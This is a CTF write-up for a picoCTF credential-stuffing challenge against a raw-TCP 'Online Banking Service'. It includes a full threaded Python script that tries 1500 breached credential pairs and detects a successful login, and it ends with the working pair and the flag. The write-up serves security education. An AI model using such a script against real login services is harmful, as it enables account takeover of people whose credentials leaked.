# CTF Writeup: Credential Stuffing

* **Platform:** CyLab / picoCTF 2026
* **Difficulty:** Medium
* **Category:** Web Exploitation
* **Vulnerability/Concept:** Credential Stuffing & Custom TCP Sockets

The CTF provided a dump of **1500 credentials** from a data breath, and a `netcat` endpoint for a seperate "Online Banking Service" endpoint on raw `TCP` port.
The idea is simple we have to reuse this provided data breached credentials in "Online Banking Service" in the hope that at least one person reused theirs.
The First thing that stood out was CTF didn't provided a normal website instead they provided a `netcat` endpoint. Upon connecting it showed a plain text prompt asking for a Username and Password

since it wasn't a website, it has no `http` structure, no header/status-line or anything a browser or a proxy like `BurpSuite` will recognise
This server didn't speak `HTTP` at all. It was a custom application protocol invented by whoever wrote the challenge, just raw text sent and received over a `TCP` socket.
Only way to understand how it works was to watch what output it printed

Since unlike normal website working at application layer, this server worked directly on transport layer so using `BurpSuite` as a proxy was out of question
so i planned to write a login automation script from scratch using `python`'s `socket` library which will perfectly work on transport layer

**My basic idea about writing script:**
since server was asking for Username and Password only
i created a `TCP` connection, sending a Username followed by newline, sending password followed by new line, and reading back what server responded
basically rebuilding by hand the behavior a browser and `HTTP` library normally provide automatically

The first version of the script produced **false positives** almost immediately, flagging multiple credential pairs as valid logins that turned out to be wrong when checked manually. The cause came down to a detail of how `TCP` actually works. `TCP` delivers an **unstructured stream of bytes** with no built-in concept of a complete message, so a single `recv` call isn't guaranteed to capture the server's full response. The script was reading only the first chunk of data, often just the echoed username, before the "Invalid username or password" text had even arrived, and treating that partial read as a successful login.

The fix was to keep reading in a loop until the connection closed cleanly, since that was the only fully reliable signal that the server had finished sending. A second, related issue showed up once a short `socket` timeout was introduced: a slow response could cause the read loop to exit on a timeout rather than a clean close, which produced the exact same false positive in a different form. The eventual rule was that a result could only be trusted if the `socket` had actually reached a **clean end of file**. A timeout meant the data was incomplete and had to be discarded, not treated as evidence of success.

With correctness sorted out, speed became the next problem, since trying **1500 credential pairs** one at a time sequentially was far too slow for the time limit. Running the login attempts concurrently with a small **thread pool** cut the total time down substantially, with a shared stop flag so that once a valid login was confirmed, the remaining in-flight attempts could stop early instead of continuing to burn through the rest of the list.

### **FINAL SCRIPT:**

```python
import socket
import concurrent.futures
import threading

HOST = "chatelaine.cylabacademy.net"
PORT = 47312
found = threading.Event()
result_holder = {}
lock = threading.Lock()

def try_login(user, passwd):
    if found.is_set():
        return
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    data = b""
    closed_cleanly = False
    try:
        s.connect((HOST, PORT))
        s.sendall((user + "\n").encode())
        s.sendall((passwd + "\n").encode())
        while True:
            chunk = s.recv(4096)
            if not chunk:
                closed_cleanly = True
                break
            data += chunk
    except Exception:
        pass
    finally:
        s.close()

    text = data.decode(errors="ignore")

    # Only trust the result if we got a clean EOF close — otherwise it's a truncated read
    if closed_cleanly and "Invalid" not in text and text.strip() != "":
        with lock:
            if not found.is_set():
                found.set()
                result_holder["user"] = user
                result_holder["passwd"] = passwd
                result_holder["text"] = text
                print(f"[+] CONFIRMED HIT: {user}:{passwd}")
    elif not closed_cleanly:
        print(f"[?] timeout/uncertain: {user}:{passwd} (will retry later)")
    else:
        print(f"[-] failed: {user}:{passwd}")

with open("creds-dump.txt") as f:
    pairs = [line.strip().split(";") for line in f if ";" in line]

with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
    futures = [executor.submit(try_login, u, p) for u, p in pairs]
    for future in concurrent.futures.as_completed(futures):
        if found.is_set():
            break

if "user" in result_holder:
    print("\n=== FINAL ===")
    print(result_holder["user"], result_holder["passwd"])
    print(result_holder["text"])
else:
    print("No confirmed hit found.")

```

The working credential pair turned out to be `ehi:smack`, and the server responded with an authentication success message followed by the flag:

> `academy{d0nt_r3u5e_cr3d3nt1als_8fc01779}`
